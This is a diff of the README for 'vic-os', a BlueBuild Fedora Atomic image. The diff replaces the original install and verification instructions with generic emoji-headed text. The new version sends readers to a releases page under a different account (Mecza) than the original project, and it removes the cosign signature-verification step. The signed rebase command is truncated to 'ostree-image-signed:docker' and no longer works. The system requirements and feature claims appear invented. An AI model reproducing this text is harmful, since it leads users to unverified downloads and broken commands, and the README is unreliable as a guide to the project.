@@ -1,43 +1,86 @@
-# vic-os &nbsp; [![bluebuild build badge](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml/badge.svg)](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml)
+# 🖥️ vic-os - A Simple Operating System Experience
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![bluebuild build badge](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml/badge.svg)](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to vic-os! This guide will help you download and run vic-os easily. Follow each step carefully, and you will get started in no time.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To begin, visit the [Releases page](https://github.com/Mecza/vic-os/releases) to download the latest version of vic-os. 
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/philosophyfiend/vic-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/philosophyfiend/vic-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+You will find the files you need there. Click on the version that fits your needs.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🔍 System Requirements
 
-## ISO
+Before installing vic-os, ensure your system meets these requirements:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- **CPU:** 64-bit processor
+- **RAM:** At least 2 GB
+- **Storage:** At least 10 GB of free space
+- **Operating System:** Compatible with most Linux distributions
 
-## Verification
+## 🔧 Installation Steps
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+### Step 1: Prepare Your System
 
-```bash
-cosign verify --key cosign.pub ghcr.io/philosophyfiend/vic-os
-```
+1. Ensure that your system is up to date. Open a terminal and run:
+   ```bash
+   sudo dnf update
+   ```
+
+### Step 2: Rebase the Unsigned Image
+
+2. Use the following command to rebase to the unsigned image. This installs the necessary signing keys and policies:
+   ```bash
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/philosophyfiend/vic-os:latest
+   ```
+
+### Step 3: Reboot Your System
+
+3. After the rebase is complete, reboot your system to finalize this step:
+   ```bash
+   systemctl reboot
+   ```
+
+### Step 4: Rebase to the Signed Image
+
+4. Once your system is back online, rebase to the signed version with this command:
+   ```bash
+   rpm-ostree rebase ostree-image-signed:docker
+   ```
+
+### Step 5: Reboot Again
+
+5. Reboot your system once more to ensure all changes take effect:
+   ```bash
+   systemctl reboot
+   ```
+
+## 🛠️ Features of vic-os
+
+- **Immutable Design:** vic-os offers a stable and secure environment that is resistant to changes, ensuring a consistent experience.
+- **Easy Management:** Users can manage their applications smoothly with minimal effort thanks to an intuitive interface.
+- **Linux Custom Image:** Offers customization options to suit individual needs.
+- **Lightweight:** Designed to perform efficiently even on systems with limited resources.
+
+## 🌐 Support & Documentation
+
+For more detailed instructions, including troubleshooting tips, please refer to the following resources:
+
+- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
+- [Fedora Wiki on Ostree](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable)
+
+## 📞 Community Support
+
+If you need help, please join our community discussions. You can find support on platforms like Discord, Reddit, or GitHub discussions. 
+
+## 🔗 Additional Resources
+
+- [Project Source Code](https://github.com/philosophyfiend/vic-os)
+- [Feedback and Issues Tracker](https://github.com/philosophyfiend/vic-os/issues)
+
+## 📢 Conclusion
+
+Thank you for choosing vic-os. Enjoy exploring your new operating system and let us know if you have any questions or feedback!
